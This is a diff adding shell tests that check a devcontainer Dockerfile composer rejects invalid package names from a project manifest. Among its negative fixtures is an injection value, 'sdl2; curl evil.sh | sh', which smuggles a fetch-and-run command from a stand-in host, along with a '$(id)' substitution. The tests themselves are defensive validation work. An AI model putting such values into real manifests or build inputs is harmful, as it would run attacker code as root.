@@ -203,4 +203,45 @@ java_ext="$(jq -r '[.[].customizations.vscode.extensions[]?][0]' "$HERE/../stack
 check "and the java stack's extension ($java_ext) is in it" \
     "$(printf '%s' "$file_json" | jq -r --arg e "$java_ext" '[.[].customizations.vscode.extensions[]?] | index($e) != null')" "true"
 
+
+# --- a project's own system packages (story
+# the-manifest-lists-packages-and-the-build-installs-them) --------------------
+#
+# chip8 needed SDL2 and the agent cannot apt-get in the container, by design.
+# The manifest's "packages" become one install step, and **nothing but a Debian
+# package name** from a repository's manifest may reach a Dockerfile that runs as
+# root: that is the first of the task's three failure scenarios.
+
+with_manifest() { printf '%s' "$1" > "$work/m.json"; STACK_MANIFEST="$work/m.json" bash "$COMPOSE" "${@:2}"; }
+step_line='RUN apt-get update && apt-get install -y --no-install-recommends libsdl2-dev tree && rm -rf /var/lib/apt/lists/*'
+
+listed="$(with_manifest '{"packages":["libsdl2-dev","tree"]}' 2>/dev/null || true)"
+check "the listed packages become one install step" "$(printf '%s\n' "$listed" | grep -cxF "$step_line" || true)" "1"
+check "which does not swallow a failure" "$(printf '%s\n' "$listed" | grep -F 'libsdl2-dev' | grep -c '|| true' || true)" "0"
+pkg_at="$(printf '%s\n' "$listed" | grep -nxF "$step_line" | cut -d: -f1 || true)"
+label_at="$(printf '%s\n' "$listed" | grep -n '^LABEL devcontainer.metadata=' | cut -d: -f1 || true)"
+check "after every fragment and before the label" "$([ -n "$pkg_at" ] && [ -n "$label_at" ] && [ "$pkg_at" -lt "$label_at" ] && echo yes || echo no)" "yes"
+check "and the label is still the last line" "$(printf '%s\n' "$listed" | tail -1 | cut -c1-29)" "LABEL devcontainer.metadata='"
+
+for bad in 'sdl2; curl evil.sh | sh' 'x$(id)' 'two words' 'LibSDL2' '-o' '--allow-unauthenticated' 'a' "\"'quoted'\"" 'line
+break'; do
+    m="$(jq -cn --arg b "$bad" '{packages: ["tree", $b]}')"
+    set +e
+    out="$(with_manifest "$m" 2>"$work/err")"; rc=$?
+    set -e
+    check "the package entry $(printf '%q' "$bad") refuses the compose" "$rc" "1"
+    check "and produces no Dockerfile" "$(printf '%s' "$out" | wc -c | tr -d ' ')" "0"
+    check "and names the entry and the rule" "$(grep -cF 'is not a Debian package name' "$work/err" || true)" "1"
+done
+
+set +e
+out="$(with_manifest '{"packages":"libsdl2-dev"}' 2>"$work/err")"; rc=$?
+set -e
+check "a packages field that is not a list refuses the compose" "$rc $(printf '%s' "$out" | wc -c | tr -d ' ')" "1 0"
+
+check "a manifest with no packages composes exactly as before" \
+    "$(with_manifest '{"limits":{"memory":"6g"}}' | sha256sum)" "$(bash "$COMPOSE" | sha256sum)"
+check "and so does an empty list" \
+    "$(with_manifest '{"packages":[]}' | sha256sum)" "$(bash "$COMPOSE" | sha256sum)"
+
 exit "$failures"
